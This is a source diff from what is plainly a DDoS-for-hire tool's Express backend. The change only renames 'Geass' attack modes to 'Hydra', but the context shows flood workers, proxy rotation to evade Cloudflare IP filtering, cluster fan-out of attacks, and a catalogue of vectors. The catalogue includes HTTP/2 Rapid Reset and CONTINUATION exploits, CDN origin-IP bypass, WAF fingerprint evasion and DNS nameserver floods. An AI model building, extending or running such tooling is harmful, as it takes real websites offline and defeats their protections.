@@ -8,7 +8,7 @@
  * With 8 CPU cores:
  *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
  *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
- *   • Geass Ovrd → 8 × triple vector = massive concurrent load
+ *   • Hydra Ovrd → 8 × triple vector = massive concurrent load
  */
 import { Router, type IRouter } from "express";
 import { eq, sql, desc } from "drizzle-orm";
@@ -202,7 +202,7 @@ async function _attackProbe(targetUrl: string): Promise<ProbeResult> {
 }
 
 // ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
-// Prevents ~140 concurrent DB writes/s during Geass Override (21+ vectors × 300ms flush)
+// Prevents ~140 concurrent DB writes/s during Hydra Override (21+ vectors × 300ms flush)
 const dbBatchPkts  = new Map<number, number>();
 const dbBatchBytes = new Map<number, number>();
 
@@ -493,7 +493,7 @@ const HTTP_PROXY_METHODS = new Set([
   "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
   "http-smuggling", "doh-flood", "keepalive-exhaust",
   "app-smart-flood", "large-header-bomb", "http2-priority-storm",
-  // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
+  // Hydra vectors — must rotate via proxy to bypass Cloudflare IP filtering
   "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst", "grpc-flood",
   "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
   // Composite bypass
@@ -955,7 +955,7 @@ function spawnPool(
 async function runAttackWorkers(
   method: string, target: string, port: number, threads: number,
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
-  id?: number, // optional — needed by Geass Override T004 adaptive burst
+  id?: number, // optional — needed by Hydra Override T004 adaptive burst
 ): Promise<void> {
   // ── Power-Level Boost ────────────────────────────────────────────────────
   // UI sends threads 1–8 (power level). Multiply to get real connection count.
@@ -1681,7 +1681,7 @@ async function runAttackWorkers(
 
 // ── Static method catalogue ───────────────────────────────────────────────
 const METHODS_CATALOGUE = [
-  // Geass / Special
+  // Hydra / Special
   { id: "geass-absolutum",      name: "Geass Absolutum ∞ [4 FRONTES — 20v+]",  layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS/DNS",tier: "ARES",   description: "PODER MÁXIMO — 4 frentes: [A] CDN/Host 11v com workers 6× escalados; [B] Origin IP direto (bypassa CDN); [C] DNS NS destruction; [D] Subdomain Spray 10 subdomínios (deploy only — força mitigação em todos os PoPs CDN). Burst 12000, KA 4096 sockets." },
   { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
   { id: "geass-ultima",         name: "Geass Ultima ∞ [11v — H3+DNS NS]",      layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS/DNS",tier: "ARES",   description: "FORMA FINAL — 11 vetores simultâneos: RapidReset+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP+H3/QUIC+DNS-NS. Zero delay, toda stack OSI" },
@@ -1689,7 +1689,7 @@ const METHODS_CATALOGUE = [
   { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
   { id: "origin-bypass",        name: "CDN Origin Bypass [Dual-Front]",         layer: "ALL",  protocol: "HTTP+TLS+TCP",         tier: "S",      description: "Auto-descobre IP de origem via subdomain enum+IPv6+SPF+MX. Front 1 (70%): ataca origem diretamente (bypassa CDN). Front 2 (30%): cache-poison+waf-bypass esgota CDN edges. Cloudflare torna-se irrelevante." },
   // L7 Application
-  { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
+  { id: "waf-bypass",           name: "Hydra WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
   { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
   { id: "http2-continuation",   name: "H2 CONTINUATION (CVE-2024-27316)",     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4" },
   { id: "hpack-bomb",           name: "HPACK Bomb (RFC 7541)",                layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "Incremental-indexed headers → HPACK table eviction storm" },
@@ -1817,14 +1817,14 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
     ctrl.signal.addEventListener("abort", () => clearInterval(_probeTimer), { once: true });
   }
 
-  // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
+  // ── Hydra Override cluster fan-out (primary node only, not peer) ────────────
   if (method === "geass-override" && !req.query.peer) {
     fanOutToCluster(target, port, method, duration, threads);
   }
 
   void runAttackWorkers(method, target, port, threads, ctrl.signal,
     (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns),
-    id, // T004: pass attack id so Geass Override burst loop can read response codes
+    id, // T004: pass attack id so Hydra Override burst loop can read response codes
   ).finally(async () => {
     // Final flush of any pending batch stats
     const pending = dbBatchPkts.get(id) ?? 0;
